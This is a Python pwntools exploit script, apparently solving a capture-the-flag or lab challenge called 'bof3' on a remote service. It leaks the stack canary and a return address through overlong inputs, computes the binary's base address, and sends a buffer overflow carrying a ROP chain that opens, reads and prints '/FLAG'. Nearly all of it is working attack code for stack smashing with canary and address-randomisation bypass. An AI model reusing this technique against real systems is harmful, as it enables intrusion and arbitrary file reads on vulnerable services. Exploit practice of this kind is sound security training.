#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

# --- Configuration ---
TASK_RETURN_ADDRESS_OFFSET = 0x9c83

context.arch = 'amd64'
context.os = 'linux'
context.endian = "little"
# context.log_level = 'debug'

BINARY_NAME = "./bof3"

try:
    elf = ELF(BINARY_NAME)
except ELFError:
    log.error(f"Could not load ELF file: {BINARY_NAME}.")
    sys.exit(1)

r = remote('up.zoolab.org', 12344)

leaked_canary = 0
leaked_task_ret_addr = 0
executable_base = 0

try:
    # --- Stage 1: Leak Canary using buf1's printf ---
    # GDB: buf1(rbp-0xc0), buf2(rbp-0x90), buf3(rbp-0x60), msg(rbp-0x30), Canary(rbp-0x8)
    padding_s1_to_canary_lsb = 185
    payload_s1_leak_canary = b'A' * padding_s1_to_canary_lsb
    
    r.recvuntil(b"What's your name? ")
    log.info(f"Stage 1: Sending {len(payload_s1_leak_canary)} 'A's to buf1 to leak canary (no newline)...")
    r.send(payload_s1_leak_canary) 

    output_s1 = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
    log.info("--- Debugging Canary Leak (Stage 1 Output) ---")
    log.info(f"Raw output: {repr(output_s1)}")
    
    try:
        welcome_prefix = b"Welcome, "
        idx_after_welcome = output_s1.index(welcome_prefix) + len(welcome_prefix)
        if not output_s1[idx_after_welcome:].startswith(payload_s1_leak_canary):
            raise PwnlibException("Canary leak: Payload 'A's not found after 'Welcome, '")
        
        canary_material_start_idx = idx_after_welcome + len(payload_s1_leak_canary)
        next_prompt_start_idx = output_s1.index(b"\nWhat's the room number? ", canary_material_start_idx)
        leaked_canary_high_bytes = output_s1[canary_material_start_idx:next_prompt_start_idx]
        
        log.info(f"Bytes visibly leaked for canary (len {len(leaked_canary_high_bytes)}): {leaked_canary_high_bytes.hex()}")

        if len(leaked_canary_high_bytes) >= 7:
            log.warning("Only 7 bytes of canary material found.")
            log.info(f"Bytes visibly leaked for canary : {leaked_canary_high_bytes[0:7].hex()}")
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes[0:7])
            log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
        elif len(leaked_canary_high_bytes) == 6:
            log.warning("Only 6 bytes of canary material found.")
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes + b'\x00')
            log.success(f"Reconstructed canary (LSB=00 + 7B): {hex(leaked_canary)}")
        else:
            log.error(f"Unexpected length for canary material: {len(leaked_canary_high_bytes)}. Expected 7.")
            raise PwnlibException("Canary material length error")
            
    except Exception as e:
        log.error(f"Error parsing canary leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 2: Leak Return Address using buf2's printf ---
    padding_s2_to_ret_addr = 152
    payload_s2_leak_retaddr = b'B' * padding_s2_to_ret_addr
    
    log.info(f"Stage 2: Sending {len(payload_s2_leak_retaddr)} 'B's to buf2 to leak return address (no newline)...")
    r.send(payload_s2_leak_retaddr)

    output_s2 = r.recvuntil(b"\nWhat's the customer's name? ", timeout=5.0)
    log.info("--- Debugging Return Address Leak (Stage 2 Output) ---")
    log.info(f"Raw output: {repr(output_s2)}")

    try:
        room_num_prefix = b"The room number is: "
        idx_after_room_prefix = output_s2.index(room_num_prefix) + len(room_num_prefix)
        if not output_s2[idx_after_room_prefix:].startswith(payload_s2_leak_retaddr):
            raise PwnlibException("RetAddr leak: Payload 'B's not found")

        ret_addr_material_start_idx = idx_after_room_prefix + len(payload_s2_leak_retaddr)
        next_prompt_start_idx_ret = output_s2.index(b"\nWhat's the customer's name? ", ret_addr_material_start_idx)
        leaked_ret_addr_low_bytes = output_s2[ret_addr_material_start_idx:next_prompt_start_idx_ret]

        log.info(f"Bytes visibly leaked for ret_addr (len {len(leaked_ret_addr_low_bytes)}): {leaked_ret_addr_low_bytes.hex()}")

        if len(leaked_ret_addr_low_bytes) == 6: 
            leaked_task_ret_addr = u64(leaked_ret_addr_low_bytes + b"\x00\x00")
            log.success(f"Constructed ret_addr (6 leaked LSBs + MSBs 0000): {hex(leaked_task_ret_addr)}")
        else:
            log.error(f"Expected 6 LSBs for ret_addr, got {len(leaked_ret_addr_low_bytes)}. RetAddr leak failed.")
            raise PwnlibException("RetAddr leak insufficient/unexpected bytes")
            
        executable_base = leaked_task_ret_addr - TASK_RETURN_ADDRESS_OFFSET # get real base address
        elf.address = executable_base
        log.success(f"Calculated executable base: {hex(executable_base)}")

    except Exception as e:
        log.error(f"Error parsing return address leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 3: Construct ROP Chain & Overflow local msg buffer ---
    padding_msg_to_canary = 40
    
    rop = ROP(elf)
    
    flag_path_addr = elf.bss() + 0x200 # Put "/FLAG\0" here
    read_buffer_addr = elf.bss() + 0x200 + 0x20 # Put flag content here

    log.info(f"ROP: Address for '/FLAG': {hex(flag_path_addr)}")
    log.info(f"ROP: Address for read buffer: {hex(read_buffer_addr)}")

    # ROP Chain:
    rop.read(0, flag_path_addr, 8)
    rop.open(flag_path_addr, 0)
    rop.read(3, read_buffer_addr, 100) # assume fd = 3
    rop.write(1, read_buffer_addr, 100)
    rop.exit(0)

    rop_chain_bytes = rop.chain()
    log.info(f"ROP chain (length {len(rop_chain_bytes)}):\n{rop.dump()}")

    junk = u64(b'A' * 8)
    
    final_payload = b'X' * padding_msg_to_canary
    final_payload += p64(leaked_canary)
    final_payload += p64(junk)
    final_payload += rop_chain_bytes

    log.info("Satisfying read into buf3 (customer's name)...")
    r.sendline(b"CustomerX")

    r.recvuntil(b"Leave your message: ")
    log.info(f"Sending final ROP overflow payload ({len(final_payload)} bytes) to local msg buffer...")
    r.send(final_payload)
    
    time.sleep(0.1)
    log.info("Sending '/FLAG\\0' for ROP chain's read()...")
    r.send(b"/FLAG\0\0\0")

    # --- Get Flag ---
    log.success("Payloads sent. ROP chain should execute.")
    flag_output = r.recvall(timeout=5.0)
    log.success("--- FLAG ---")
    if flag_output:
        try:
            decoded_output = flag_output.decode(errors='ignore').strip()

            start_index = decoded_output.find("FLAG{")
            if start_index != -1:
                end_index = decoded_output.find("}", start_index)
                if end_index != -1:
                    flag_only = decoded_output[start_index : end_index + 1]
                    print(flag_only)
                else:
                    log.warning("Found 'FLAG{' but no closing '}'. Printing what was found.")
                    print(decoded_output[start_index:])
            else:
                log.warning("FLAG pattern 'FLAG{' not found in output. Printing full decoded output.")
                print(decoded_output)
        except Exception as e:
            log.error(f"Error decoding or parsing flag: {e}")
            print(repr(flag_output))
    else:
        log.warning("No flag output received.")
    log.success("--------------")

except PwnlibException as e:
    log.critical(f"A PwnlibException occurred: {e}")
    sys.exit(1)
except Exception as e:
    log.critical(f"An unexpected Python error occurred: {e}")
    import traceback; traceback.print_exc()
finally:
    if r.connected():
        r.close()
